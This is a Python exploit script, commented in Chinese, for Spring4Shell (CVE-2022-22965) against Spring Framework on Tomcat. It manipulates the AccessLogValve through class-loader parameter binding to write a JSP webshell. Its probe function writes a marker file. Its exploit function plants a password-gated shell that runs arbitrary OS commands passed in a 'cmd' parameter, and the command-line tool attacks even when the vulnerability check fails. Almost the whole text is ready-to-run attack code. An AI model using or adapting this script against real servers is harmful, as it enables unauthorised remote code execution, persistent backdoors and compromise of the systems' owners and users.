import requests
import argparse
import sys
import time
import urllib.parse

"""
Spring4Shell (CVE-2022-22965)
通过 Spring 数据绑定操控 Tomcat AccessLogValve 写入 JSP webshell
影响: Spring Framework 5.3.0~5.3.17 / 5.2.0~5.2.19 + JDK 9+ + Tomcat WAR
"""

HEADERS = {
    "suffix": "%>//",
    "c1": "Runtime",
    "c2": "<%",
    "DNT": "1",
}

WEB_SHELL_MARKER = "Spring4ShellRCE"

EXPLOIT_PATTERN = (
    '%{c2}i '
    'if("j".equals(request.getParameter("pwd"))){ '
    'java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); '
    'int a = -1; '
    'byte[] b = new byte[2048]; '
    'while((a=in.read(b))!=-1){ out.println(new String(b)); } '
    '} '
    '%{suffix}i'
)

SHELL_PREFIX = "spring4shell"
SHELL_SUFFIX = ".jsp"


def build_data(shell_dir: str) -> str:
    params = {
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": EXPLOIT_PATTERN,
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": SHELL_SUFFIX,
        "class.module.classLoader.resources.context.parent.pipeline.first.directory": shell_dir,
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": SHELL_PREFIX,
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
    }
    return urllib.parse.urlencode(params)


def probe(target: str, endpoint: str) -> str | None:
    """写入探测 JSP 文件确认漏洞"""
    marker = "SPRING4SHELL_PROBE"

    probe_params = {
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": f"%{{c2}}i%{{{marker}}}%{{suffix}}i",
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "probe_",
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
    }

    try:
        r = requests.post(
            f"{target}{endpoint}",
            data=urllib.parse.urlencode(probe_params),
            headers=HEADERS,
            timeout=10,
        )
        print(f"[*] 探测请求: HTTP {r.status_code}")
    except Exception as e:
        print(f"[-] 探测请求失败: {e}")
        return None

    time.sleep(2)

    for path in ["/probe_.jsp", "/ROOT/probe_.jsp"]:
        try:
            r = requests.get(f"{target}{path}", timeout=5)
            if r.status_code == 200 and marker in r.text:
                print(f"[+] 漏洞确认! 写入路径: {path}")
                return "webapps/ROOT"
        except Exception:
            continue

    return None


def exploit(target: str, endpoint: str, cmd: str, shell_dir: str) -> str:
    data = build_data(shell_dir)

    try:
        r = requests.post(f"{target}{endpoint}", headers=HEADERS, data=data, timeout=10)
        print(f"[*] 写入 webshell: HTTP {r.status_code}")
    except Exception as e:
        return f"[-] 写入失败: {e}"

    time.sleep(2)

    shell_url = f"{target}/{SHELL_PREFIX}{SHELL_SUFFIX}"
    try:
        r = requests.post(shell_url, params={"pwd": "j", "cmd": cmd}, timeout=15)
        if r.status_code == 200 and r.text.strip():
            return r.text.strip()
        elif r.status_code == 404:
            return f"[-] webshell 404, 尝试手动: {shell_url}?pwd=j&cmd=id"
        else:
            return f"[-] HTTP {r.status_code}: {r.text[:300]}"
    except Exception as e:
        return f"[-] 命令执行失败: {e}"


def main():
    parser = argparse.ArgumentParser(description="Spring4Shell CVE-2022-22965")
    parser.add_argument("-u", "--url", required=True, help="目标 URL")
    parser.add_argument("-e", "--endpoint", default="/", help="注入端点, 默认 /")
    parser.add_argument("-c", "--cmd", default="id", help="执行命令, 默认 id")
    parser.add_argument("--dir", default="webapps/ROOT", help="Tomcat webapps 路径, 默认 webapps/ROOT")
    parser.add_argument("--check", action="store_true", help="仅检测漏洞")
    args = parser.parse_args()

    target = args.url.rstrip("/")

    if args.check:
        result = probe(target, args.endpoint)
        if result:
            print(f"[+] 目标存在漏洞, webapps 路径: {result}")
        else:
            print("[-] 未检测到漏洞")
        sys.exit(0)

    print(f"[*] 目标: {target}")
    print(f"[*] 路径: {args.dir}")
    print(f"[*] 命令: {args.cmd}\n")

    # 先探测
    detected = probe(target, args.endpoint)
    if not detected:
        print("[!] 探测未确认, 尝试直接攻击...\n")
        detected = args.dir

    output = exploit(target, args.endpoint, args.cmd, detected)
    print(f"\n[+] 结果:\n{output}")
    print(f"\n[*] webshell: {target}/{SHELL_PREFIX}{SHELL_SUFFIX}?pwd=j&cmd=whoami")


if __name__ == "__main__":
    main()
